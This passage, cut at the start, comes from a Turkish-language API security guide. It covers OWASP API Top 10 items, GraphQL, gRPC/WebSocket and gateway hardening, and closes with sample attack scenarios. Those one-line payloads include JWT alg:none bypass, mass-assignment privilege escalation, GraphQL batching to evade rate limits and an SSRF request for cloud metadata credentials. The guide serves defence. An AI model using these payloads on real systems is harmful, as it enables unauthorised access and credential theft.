* DNS rebinding'e karşı, doğrulama anındaki IP ile isteğin gerçekten gittiği IP teyit edilmeli

### API8 — Security Misconfiguration
* Konfigürasyonlar kod gibi versiyonlanmalı (IaC) ve otomatik güvenlik taramasından geçirilmeli
* Production'da debug modu ve detaylı hata çıktısı kesinlikle kapatılmalı
* CORS politikası explicit whitelist ile tanımlanmalı, `*` + credentials kombinasyonundan kaçınılmalı
* Düzenli konfigürasyon denetimi (hardening checklist) CI/CD'ye entegre edilmeli

### API9 — Improper Inventory Management
* Merkezi bir API envanteri (host, versiyon, sahip ekip, yetkilendirme modeli) tutulup düzenli güncellenmeli
* Kullanılmayan/eski API versiyonları aktif olarak kapatılmalı, sadece gizlenmemeli
* Tüm ortamlar (dev/staging/prod) için erişim kontrolü aynı seviyede tutulmalı
* Otomatik API keşif taramaları (DAST + envanter karşılaştırma) periyodik çalıştırılmalı

### API10 — Unsafe Consumption of APIs
```python
# ✅ gelen veri şema doğrulamasından geçiriliyor, parametrize sorgu kullanılıyor
jsonschema.validate(data, schema)
db.execute("INSERT INTO logs (info) VALUES (%s)", (data["note"],))
```
* Üçüncü taraf API yanıtlarını **kullanıcı girdisi gibi** ele alın: doğrulayın, sanitize edin, şema kontrolü uygulayın
* TLS doğrulamasını asla devre dışı bırakmayın, sertifika pinning değerlendirin
* Redirect takibini sınırlayın ve hedef domaini whitelist ile kontrol edin

### GraphQL
* Production'da introspection kapatılmalı
* Sorgu derinliği ve karmaşıklığı sınırlandırılmalı
* Rate limiting, HTTP istek sayısı yerine **sorgu/alias sayısına** göre de hesaplanmalı
* Resolver'larda parametrized query / ORM kullanımı zorunlu tutulmalı

### gRPC / WebSocket
* gRPC'de production'da server reflection kapatılmalı, mTLS zorunlu tutulmalı
* WebSocket mesajlarında **her action için** sunucu tarafı yetki kontrolü yapılmalı, sadece handshake yeterli görülmemeli

### Gateway/WAF ve Rate Limit Bypass
* Gateway ve backend'in HTTP parse davranışları standartlaştırılmalı
* Rate limiting, güvenilmeyen header'lara değil, TLS bağlantı bilgisi + authenticated user ID'ye göre uygulanmalı
* Endpoint normalizasyonu (trailing slash, case, encoding) gateway seviyesinde tek noktada yapılmalı
* OTP/login deneme sayacı kullanıcı hesabına bağlanmalı, session'a değil

---

## Yaygın Senaryolar

* BOLA — nested kaynak manipülasyonu
  `GET /api/v1/companies/12/departments/9931/employees/77482`

* JWT `alg:none` ile imza atlatma
  `{"alg":"none"} → user_id manipülasyonu`

* Mass Assignment ile yetki yükseltme
  `PUT /api/v1/profile { "is_admin": true }`

* GraphQL batching ile rate-limit atlatma
  `query { a1: login(...) a2: login(...) ... }`

* SSRF ile bulut metadata sızıntısı
  `callback_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`

* HPP ile WAF/backend uyuşmazlığı istismarı
  `?amount=10&amount=100000`

---
